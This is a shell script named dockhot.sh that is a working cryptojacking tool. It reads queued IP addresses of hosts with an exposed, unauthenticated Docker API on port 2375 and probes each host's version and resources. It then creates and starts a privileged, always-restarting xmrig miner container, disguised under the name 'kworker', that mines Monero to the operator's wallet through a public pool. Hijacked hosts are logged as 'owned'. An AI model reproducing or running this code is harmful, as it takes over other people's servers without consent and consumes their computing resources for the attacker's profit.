#!/bin/sh
# ============================================================================
# dockhot.sh - deploy a nest hit in seconds, not at the next dock.sh cycle.
#
# Why this exists: measured, ~88% of the endpoints sitting in the queue do not
# answer by the time the normal pass walks to them, and a nest hit is the freshest
# signal we own - a victim proved :2375 was open *seconds* ago. dock.sh is thorough
# (/info ordering, mockchecks, ledger rotation, re-arm) and therefore slow; this is
# the fast path: version, create, start, record. No ordering, no rotation.
#
# nestd appends every fresh hit to .hunt/hot.queue; this drains the head.
# It writes the same .hunt/dock.owned and .hunt/dock.live as dock.sh, so the two
# agree about what we hold.
#
# usage: dockhot.sh [max]      (timer: every minute, HOT_MAX hosts)
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
SYSDIR="${SYSDIR:-/tmp/.sysd}"
E_MAX="${HOT_MAX:-}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK" 2>/dev/null || :
HOT="$WORK/hot.queue"
OWNFILE="$WORK/dock.owned"
LIVE="$WORK/dock.live"
DEAD="$WORK/dock.dead"
touch "$HOT" "$OWNFILE" "$LIVE"
MAX="${E_MAX:-${HOT_MAX:-14}}"
PAR="${HOT_PAR:-6}"
IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
POOL="${POOL:-pool.supportxmr.com:443}"
[ -n "${WALLET:-}" ] || { echo "dockhot: WALLET unset"; exit 0; }

TAG="\"kworker\":\"1\""
NOW=$(date +%s)

# same maths as dock.sh: the host's own size decides the thread count, and a tight
# host gets light mode rather than an OOM corpse
threads_for() {
    nc=${1:-0}; mm=${2:-0}
    t=$((nc - 1)); [ "$t" -lt 1 ] && t=1
    if [ "$mm" -gt 0 ]; then
        cap=$(( (mm - 805306368) / 268435456 ))
        [ "$cap" -lt 1 ] && cap=1
        [ "$t" -gt "$cap" ] && t=$cap
    fi
    [ "$t" -gt 16 ] && t=16
    printf '%s' "$t"
}

one() {
    ip=$1
    b="http://$ip:2375"
    if ! v=$(curl -fsS --max-time 3 "$b/version" 2>/dev/null); then
        echo "hot: $ip no-api"
        printf '%s\t%s\n' "$ip" "$NOW" >> "$WORK/hot.tried"
        return 0
    fi
    case "$v" in *ApiVersion*) ;; *) echo "hot: $ip not-docker"; return 0 ;; esac
    inf=$(curl -fsS --max-time 3 "$b/info" 2>/dev/null) || inf=""
    memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
    ncpu=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    lst=$(curl -sS --max-time 4 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    case "$lst" in
        *"\"kworker"*|*"$IMAGE"*)
            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
            echo "hot: $ip already ours"
            return 0 ;;
    esac
    th=$(threads_for "${ncpu:-0}" "${memb:-0}")
    args="-o $POOL -u $WALLET -p $ip --no-color -k"
    case "${TLS:-true}" in true|TRUE|1|yes) args="$args --tls" ;; esac
    args="$args --cpu-max-threads-hint=100 --huge-pages-jit --cpu-no-yield --threads=$th --http-port=47999 --http-host=0.0.0.0"
    if [ -n "${memb:-}" ] && [ "$memb" -lt 2500000 ]; then
        args=$(printf '%s' "$args" | sed 's|--huge-pages-jit|--randomx-mode=light|')
    fi
    memlim=0
    if [ -n "${memb:-}" ] && [ "$memb" -gt 1500000000 ]; then memlim=$((memb * 4 / 5)); fi
    _mem=""; [ "$memlim" -gt 0 ] && _mem=",\"Memory\":$memlim"
    sup="while :; do /usr/bin/xmrig $args; sleep 10; done"
    B1="{\"Image\":\"$IMAGE\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"$sup\"],\"Labels\":{$TAG},\"ExposedPorts\":{\"47999/tcp\":{}},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\",\"PortBindings\":{\"47999/tcp\":[{\"HostPort\":\"47999\"}]}$_mem}}"
    B2="{\"Image\":\"$IMAGE\",\"Cmd\":[\"-o\",\"$POOL\",\"-u\",\"$WALLET\",\"-p\",\"$ip\",\"--no-color\",\"-k\",\"--tls\",\"--threads=$th\"],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
    for cand in "$B1" "$B2"; do
        r=$(curl -fsS --max-time 25 -X POST "$b/containers/create?name=kworker" \
                -H "Content-Type: application/json" -d "$cand" 2>/dev/null) || continue
        id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
        err=$(curl -sS --max-time 20 -X POST "$b/containers/${id:-kworker}/start" 2>/dev/null) || err=x
        if [ -z "$err" ]; then
            printf '%s\t%s\n' "$ip" "kworker" >> "$OWNFILE"
            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
            echo "hot: DEPLOYED $ip threads=$th mem=$memlim"
            return 0
        fi
        curl -sS --max-time 10 -X DELETE "$b/containers/${id:-kworker}?force=1" >/dev/null 2>&1 || :
    done
    echo "hot: $ip create/start failed"
    printf '%s\t%s\n' "$ip" "$NOW" >> "$WORK/hot.tried"
}

# drain the head of the queue; anything not taken stays for the next minute
[ -s "$HOT" ] || { echo "dockhot: queue empty"; exit 0; }
tot=$(wc -l < "$HOT")
head -n "$MAX" "$HOT" > "$WORK/hot.$$"
tail -n +$((MAX + 1)) "$HOT" > "$WORK/hotrest.$$" 2>/dev/null || : > "$WORK/hotrest.$$"

n=0
while read -r ip rest; do
    [ -n "$ip" ] || continue
    if [ -s "$DEAD" ] && grep -qxF "$ip" "$DEAD" 2>/dev/null; then
        echo "hot: $ip classified useless"; continue
    fi
    n=$((n + 1))
    one "$ip" &
    [ $((n % PAR)) -eq 0 ] && wait || true
done < "$WORK/hot.$$"
wait || true
mv -f "$WORK/hotrest.$$" "$HOT" 2>/dev/null || :
rm -f "$WORK/hot.$$"
sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || :
echo "dockhot: attempted $n of $tot queued, $(wc -l < "$HOT") left"
